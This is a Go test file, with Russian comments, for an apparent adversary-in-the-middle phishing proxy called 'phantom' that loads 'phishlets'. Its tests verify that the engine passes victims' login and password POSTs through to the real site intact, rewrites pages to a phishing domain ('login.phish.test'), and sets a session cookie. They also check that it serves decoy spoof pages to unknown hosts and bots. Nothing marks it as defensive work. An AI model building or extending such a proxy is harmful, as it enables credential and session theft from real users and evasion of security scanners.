package proxy

import (
	"io"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"time"

	"github.com/phantom-v2/phantom/core/phishlet"
	"github.com/phantom-v2/phantom/core/session"
	"github.com/phantom-v2/phantom/internal/ratelimit"
	"github.com/phantom-v2/phantom/internal/spoof"
)

// e2e: upstream -> engine -> rewrite + sid + POST без потерь.
func TestEngineForwardsAndRewrites(t *testing.T) {
	var gotHost string
	upstream := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		gotHost = r.Host
		if r.Method == http.MethodPost {
			b, _ := io.ReadAll(r.Body)
			if !strings.Contains(string(b), "passwd=secret") {
				t.Errorf("upstream lost POST body: %q", string(b))
			}
			w.WriteHeader(http.StatusOK)
			return
		}
		w.Header().Set("Content-Type", "text/html")
		_, _ = io.WriteString(w, `<a href="https://origin.upstream.test/">x</a><body></body>`)
	}))
	defer upstream.Close()

	st := phishlet.NewStore()
	if err := st.LoadDir("../../configs/phishlets"); err != nil {
		t.Fatalf("LoadDir: %v", err)
	}
	eng := New(st, session.NewMemory(0), nil)
	eng.SetUpstream(map[string]string{"origin.upstream.test": upstream.URL})
	eng.SetJS(func(src string, _ int64) string { return src })

	// 1. Неизвестный хост -> spoof 404
	req := httptest.NewRequest(http.MethodGet, "http://unknown.test/", nil)
	rec := httptest.NewRecorder()
	eng.ServeHTTP(rec, req)
	if rec.Code != http.StatusNotFound {
		t.Fatalf("expected 404, got %d", rec.Code)
	}

	// 2. GET форвард + rewrite + sid
	req2 := httptest.NewRequest(http.MethodGet, "http://login.phish.test/", nil)
	req2.Header.Set("User-Agent", "Mozilla/5.0 Chrome/126")
	req2.Header.Set("Accept-Language", "en-US")
	req2.Header.Set("Accept", "text/html")
	rec2 := httptest.NewRecorder()
	eng.ServeHTTP(rec2, req2)
	if rec2.Code != 200 {
		t.Fatalf("expected 200, got %d body=%q", rec2.Code, rec2.Body.String())
	}
	if !strings.Contains(rec2.Body.String(), "login.phish.test") {
		t.Fatalf("rewrite missing: %q", rec2.Body.String())
	}
	if !strings.Contains(rec2.Result().Header.Get("Set-Cookie"), "sid=") {
		t.Fatal("sid cookie missing")
	}

	// 3. POST форвард без потерь
	req3 := httptest.NewRequest(http.MethodPost, "http://login.phish.test/",
		strings.NewReader("login=a&passwd=secret"))
	req3.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req3.Header.Set("User-Agent", "Mozilla/5.0 Chrome/126")
	req3.Header.Set("Accept-Language", "en-US")
	req3.Header.Set("Accept", "*/*")
	rec3 := httptest.NewRecorder()
	eng.ServeHTTP(rec3, req3)
	if rec3.Code != 200 {
		t.Fatalf("POST expected 200, got %d", rec3.Code)
	}
	// 4. Апстрим всегда видит Host оригинала (prod и override одинаково).
	if gotHost != "origin.upstream.test" {
		t.Fatalf("upstream Host = %q, want origin.upstream.test", gotHost)
	}
}

// rate-limit интеграция: реальный internal/ratelimit через SetLimiter.
// Первые max запросов проходят, следующий получает 429.
func TestEngineRateLimitsAfterBurst(t *testing.T) {
	upstream := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "text/html")
		_, _ = io.WriteString(w, `<p>ok</p>`)
	}))
	defer upstream.Close()

	st := phishlet.NewStore()
	if err := st.LoadDir("../../configs/phishlets"); err != nil {
		t.Fatalf("LoadDir: %v", err)
	}
	eng := New(st, session.NewMemory(0), nil)
	eng.SetUpstream(map[string]string{"origin.upstream.test": upstream.URL})
	eng.SetLimiter(ratelimit.New(2, time.Minute))

	codes := []int{}
	for i := 0; i < 3; i++ {
		req := httptest.NewRequest(http.MethodGet, "http://login.phish.test/", nil)
		req.RemoteAddr = "10.9.9.9:1234" // фиксированный IP: все хиты в одно окно
		rec := httptest.NewRecorder()
		eng.ServeHTTP(rec, req)
		codes = append(codes, rec.Code)
	}
	if codes[0] != 200 || codes[1] != 200 {
		t.Fatalf("first 2 must pass, got %v", codes)
	}
	if codes[2] != http.StatusTooManyRequests {
		t.Fatalf("3rd must be 429, got %v", codes)
	}
}

// spoof-заголовки: неизвестный хост и бот-ответ отдают Website Spoofing
// страницу с сикьюрити-заголовками, а не голый 404/redirect наружу.
func TestEngineSpoofSecurityHeaders(t *testing.T) {
	st := phishlet.NewStore()
	if err := st.LoadDir("../../configs/phishlets"); err != nil {
		t.Fatalf("LoadDir: %v", err)
	}

	// 1. Дефолт без spoof-функции: 404 + сикьюрити-заголовки.
	eng := New(st, session.NewMemory(0), nil)
	req := httptest.NewRequest(http.MethodGet, "http://unknown.test/", nil)
	rec := httptest.NewRecorder()
	eng.ServeHTTP(rec, req)
	if rec.Code != http.StatusNotFound {
		t.Fatalf("expected 404, got %d", rec.Code)
	}
	assertSpoofHeaders(t, rec)

	// 2. Со spoof.Render: 200 + html-страница в контексте хоста + те же заголовки.
	eng2 := New(st, session.NewMemory(0), nil)
	eng2.SetGuard(nil, nil, spoof.Render)
	req2 := httptest.NewRequest(http.MethodGet, "http://unknown.test/", nil)
	rec2 := httptest.NewRecorder()
	eng2.ServeHTTP(rec2, req2)
	if rec2.Code != http.StatusOK {
		t.Fatalf("expected 200 spoof page, got %d", rec2.Code)
	}
	if ct := rec2.Header().Get("Content-Type"); !strings.Contains(ct, "text/html") {
		t.Fatalf("spoof page must be html, got %q", ct)
	}
	if !strings.Contains(rec2.Body.String(), "unknown.test") {
		t.Fatalf("spoof page must mention host, got %q", rec2.Body.String())
	}
	assertSpoofHeaders(t, rec2)
}

func assertSpoofHeaders(t *testing.T, rec *httptest.ResponseRecorder) {
	t.Helper()
	if got := rec.Header().Get("X-Content-Type-Options"); got != "nosniff" {
		t.Errorf("X-Content-Type-Options = %q, want nosniff", got)
	}
	if got := rec.Header().Get("X-Frame-Options"); got != "DENY" {
		t.Errorf("X-Frame-Options = %q, want DENY", got)
	}
	if got := rec.Header().Get("Referrer-Policy"); got != "no-referrer" {
		t.Errorf("Referrer-Policy = %q, want no-referrer", got)
	}
}
